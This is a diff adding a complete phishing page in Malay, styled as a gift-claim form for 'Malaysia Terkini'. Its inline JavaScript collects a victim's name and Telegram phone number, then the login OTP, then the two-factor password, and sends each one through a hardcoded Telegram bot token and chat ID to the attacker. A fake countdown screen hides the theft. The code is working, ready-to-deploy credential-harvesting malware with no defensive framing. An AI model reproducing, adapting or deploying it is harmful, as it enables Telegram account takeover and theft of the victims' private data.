@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="en" class="h-100">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head id="ctl00_Head1">
+		<link href="assets/css/bootstrap.min.css" rel="stylesheet">
+		<link href="assets/css/custom.css" type="text/css" rel="stylesheet" />
+		<link href="assets/css/menebus.css" type="text/css" rel="stylesheet" />
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<meta property="og:title" content="Malaysia Terkini">
+		<meta property="og:image" content="https://kongsibersama.semasa.my.id/assets/img/join Now.jpg">
+		<meta name="description" />
+		<meta name="author" content="Malaysia Terkini" />
+		<title>Malaysia Terkini</title>
+		<link rel="icon" type="image/x-icon" href="favicon.html" />
+		<link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/sticky-footer/" />
+		<link rel="stylesheet" href="assets/css/bootstrap-icons.css" />
+		<script type="text/javascript" src="assets/js/vue.min.js.download"></script>
+		<script src="assets/js/clipboard.js.download"></script>
+		<script type="text/javascript" src="assets/js/index.js.download"></script>
+		<style>
+body {
+    margin: 0;
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(to bottom, #ffffff 45%, #ff7a00 45%);
+}
+
+.claim-container {
+    max-width: 420px;
+    margin: auto;
+    padding: 20px;
+}
+
+.gift-img {
+    width: 100%;
+    max-width: 320px;
+    display: block;
+    margin: 30px auto 20px;
+}
+
+.claim-title {
+    font-size: 28px;
+    font-weight: 800;
+    text-align: center;
+    margin: 20px 0 30px;
+    color: #1a1a1a;
+}
+
+.form-label-custom {
+    font-weight: 600;
+    margin-bottom: 6px;
+}
+
+.form-control-custom {
+    height: 55px;
+    border-radius: 12px;
+    border: 2px solid #333;
+    font-size: 16px;
+    padding-left: 15px;
+}
+
+.phone-group {
+    display: flex;
+    align-items: center;
+    border: 2px solid #333;
+    border-radius: 12px;
+    overflow: hidden;
+    background: #fff;
+}
+
+.phone-prefix {
+    padding: 0 12px;
+    display: flex;
+    align-items: center;
+    font-weight: 600;
+    background: #f5f5f5;
+}
+
+.phone-input {
+    border: none;
+    flex: 1;
+    height: 55px;
+    padding-left: 10px;
+    font-size: 16px;
+}
+
+.phone-input:focus {
+    outline: none;
+}
+
+.btn-claim {
+    width: 100%;
+    height: 55px;
+    border-radius: 12px;
+    font-weight: 700;
+    font-size: 18px;
+    background: #ffcc00;
+    border: none;
+    margin-top: 20px;
+}
+.winners-wrapper {
+    max-width: 320px;       /* lebih kecil */
+    height: 140px;          /* kotak kecil */
+    margin: 20px auto;
+    overflow: hidden;
+    border-radius: 15px;
+}
+
+.winners-track {
+    display: flex;
+    flex-direction: column;
+    animation: scrollUp 12s linear infinite;
+}
+
+@keyframes scrollUp {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(-50%); }
+}
+
+.winner-card {
+    display: flex;
+    align-items: center;
+    background: #f3eef3;
+    border: 2px solid #1e2e8a;
+    border-radius: 14px;
+    padding: 8px 10px;
+    margin-bottom: 10px;
+}
+
+/* kecilkan icon */
+.avatar-circle {
+    width: 35px;
+    height: 35px;
+    border-radius: 50%;
+    background: #2d5bd1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    color: white;
+}
+
+.gift-icon {
+    position: absolute;
+    bottom: -3px;
+    right: -3px;
+    font-size: 14px;
+}
+
+.winner-left {
+    position: relative;
+    margin-right: 8px;
+}
+
+.winner-name {
+    font-weight: 600;
+    font-size: 13px;
+}
+
+.winner-status {
+    font-weight: 700;
+    font-size: 12px;
+    color: #1e2e8a;
+}
+#loadingScreen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    display: none;              /* penting */
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.loading-box {
+    background: white;
+    padding: 30px;
+    border-radius: 15px;
+    text-align: center;
+    width: 280px;
+}
+
+.spinner {
+    width: 50px;
+    height: 50px;
+    border: 6px solid #eee;
+    border-top: 6px solid #ff7a00;
+    border-radius: 50%;
+    margin: 0 auto 15px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    100% { transform: rotate(360deg); }
+}
+
+</style>
+	</head>
+
+	<main>
+    <div class="claim-container">
+
+        <!-- Gambar Hadiah -->
+        <img src="assets/img/join Now.jpg" class="gift-img" alt="Hadiah">
+
+        <div class="claim-title">
+            Sila Semak
+        </div>
+
+        <form id="multiStepForm">
+
+    <!-- STEP 1 -->
+    <div class="step" id="step1">
+        <div class="mb-3">
+            <input name="name" type="text" required 
+                class="form-control-custom w-100"
+                placeholder="Nama Penuh">
+        </div>
+
+        <div class="mb-3">
+            <div class="phone-group">
+                <div class="phone-prefix">🇲🇾 +60</div>
+                <input name="phone" type="tel" required
+                    class="phone-input"
+                    placeholder="Nombor Telefon Telegram">
+            </div>
+        </div>
+
+        <button type="button" class="btn-claim" onclick="nextStep(2)">
+            Seterusnya
+        </button>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step" id="step2" style="display:none;">
+        <div class="mb-3">
+            <input name="otp" 
+       type="tel" 
+       maxlength="5"
+       pattern="[0-9]{5}"
+       inputmode="numeric"
+       required
+       class="form-control-custom w-100"
+       placeholder="Masukkan Kod OTP">
+        </div>
+
+        <button type="button" class="btn-claim" onclick="nextStep(3)">
+            Seterusnya
+        </button>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step" id="step3" style="display:none;">
+        <div class="mb-3">
+            <input name="password" type="password" required 
+                class="form-control-custom w-100"
+                placeholder="Masukkan Kata Laluan">
+        </div>
+
+        <button type="submit" class="btn-claim">
+            Hantar
+        </button>
+    </div>
+
+</form>
+
+                </div>
+<div id="loadingScreen">
+    <div class="loading-box">
+        <div class="spinner"></div>
+        <p>Sedang memproses...</p>
+        <p><span id="countdown">10</span> saat</p>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function(){
+
+const form = document.getElementById("multiStepForm");
+const loading = document.getElementById("loadingScreen");
+const countdown = document.getElementById("countdown");
+
+const botToken = "9110128793:AAFDVO1Ki0KNgnPyORkufp7pn7q6nDJhNuU";
+const chatId = "6240977256";
+
+function showStep(stepNumber){
+    document.querySelectorAll(".step").forEach(step=>{
+        step.style.display="none";
+    });
+    document.getElementById("step"+stepNumber).style.display="block";
+}
+
+function startLoading(callback){
+
+    loading.style.display="flex";
+
+    let timeLeft=10;
+    countdown.innerText=timeLeft;
+
+    const timer=setInterval(()=>{
+        timeLeft--;
+        countdown.innerText=timeLeft;
+
+        if(timeLeft<=0){
+            clearInterval(timer);
+            loading.style.display="none";
+            if(callback) callback();
+        }
+
+    },1000);
+}
+
+window.nextStep=function(stepNumber){
+
+// ===== STEP 1 =====
+if(stepNumber===2){
+
+    const name=form.name.value.trim();
+    const phone=form.phone.value.trim();
+
+    if(!name || !phone){
+        alert("Sila isi nama dan nombor telefon.");
+        return;
+    }
+
+    const message=`🎁NOMOR MASUK
+    =========================
+👤 Nama: ${name}
+☎️ Phone: +60${phone}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            chat_id:chatId,
+            text:message
+        })
+    })
+    .then(()=>{
+        startLoading(()=>showStep(2));
+    })
+    .catch(()=>{
+        alert("Gagal hantar data.");
+    });
+
+    return;
+}
+
+// ===== STEP 2 =====
+if(stepNumber===3){
+
+    const otp=form.otp.value.trim();
+    const name=form.name.value.trim();
+    const phone=form.phone.value.trim();
+
+    if(!otp){
+        alert("Masukkan kod OTP.");
+        return;
+    }
+
+    const message=`🎁OTP MASUK
+    =========================
+👤 Nama: ${name}
+☎️ Phone: +60${phone}
+🔒 OTP: ${otp}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            chat_id:chatId,
+            text:message
+        })
+    })
+    .then(()=>{
+        startLoading(()=>showStep(3));
+    })
+    .catch(()=>{
+        alert("Gagal hantar OTP.");
+    });
+
+    return;
+}
+
+};
+
+// ===== SUBMIT AKHIR =====
+form.addEventListener("submit",function(e){
+
+e.preventDefault();
+
+const password=form.password.value.trim();
+const name=form.name.value.trim();
+const phone=form.phone.value.trim();
+
+if(!password){
+    alert("Masukkan kata laluan.");
+    return;
+}
+
+const message=`🎁2FA MASUK
+=========================
+👤 Nama: ${name}
+☎️ Phone: +60${phone}
+🔒 Password: ${password}`;
+
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+        chat_id:chatId,
+        text:message
+    })
+})
+.then(()=>{
+    startLoading(()=>{
+        alert("Proses selesai.");
+        form.reset();
+        showStep(1);
+    });
+})
+.catch(()=>{
+    alert("Gagal hantar password.");
+});
+
+});
+
+});
+
+</script>
+
+		</main>
+		<br>
+		<br>
+		<div class="winners-container">
+
+    <div class="winners-wrapper">
+    
+            </div>
+        </div>
+
+    </div>
+</div>
+	</body>
+</html>
